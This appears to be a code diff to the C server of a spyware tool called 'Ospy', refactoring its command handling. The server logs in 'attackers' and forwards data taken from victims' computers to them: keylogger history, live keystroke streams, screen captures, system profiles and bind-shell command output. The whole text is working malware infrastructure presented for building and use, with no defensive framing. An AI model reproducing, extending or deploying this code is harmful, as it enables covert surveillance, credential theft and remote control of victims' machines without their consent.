@@ -116,8 +116,6 @@ int main (){
 						switch (message.action) {
 							case LOG_IN :
 								loging_in_status = log_in_attacker(decrypt_text(message.data.encrypted_login_to_Ospy.username, AES_KEY), decrypt_text(message.data.encrypted_login_to_Ospy.password, AES_KEY));
-//								printf("user name : %s\npassword : %s",  ,message.data.encrypted_login_to_Ospy.password);
-//								fflush(stdout);
 								send(socket_descriptor, &loging_in_status, sizeof(registration_status), 0);
 								if (loging_in_status == SUCCESS){// if attacker loged in -connect he's id the hes socket descriptor
 									strcpy(clients_list[i].id, decrypt_text(message.data.encrypted_login_to_Ospy.username, AES_KEY)); // set attackers id = user name
@@ -169,33 +167,18 @@ int main (){
 								
 								break;
 								
+							// all these options result in sending back a file to the attacker. the server does nothing more than forwarding it to the right attacker
 							case GET_KEYLOGGER_HISTORY :
+							case GET_SYSTEM_PROFILER :
+							case GET_SCREEN_STREAM :
+							case SEND_BIND_SHELL_COMMAND :
 								send(clients_list[i].other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
 								
 								break;
 								
 							case GET_KEYSTROKES_STREAM :
 								//printf("\n%s",message.data.keylogger_stream_key);
-								send(clients_list[i].other_side_sfd, decrypt_text(message.data.keylogger_stream_key, AES_KEY) , sizeof(message.data.keylogger_stream_key), 0);
-								
-								break;	
-								
-							case GET_SCREEN_STREAM :
-								send(clients_list[i].other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
-								
-								break;
-								
-							case GET_SYSTEM_PROFILER :
-								send(clients_list[i].other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
-								
-								break;
-								
-							case SEND_BIND_SHELL_COMMAND :
-								send(clients_list[i].other_side_sfd, &message.data.file_data, sizeof(message.data.file_data), 0);
-								
-								break;	
-								
-							case STUCK_VICTIMS_COMPUTER :
+								send(clients_list[i].other_side_sfd, message.data.keylogger_stream_key, sizeof(message.data.keylogger_stream_key), 0);
 								
 								break;	
 								
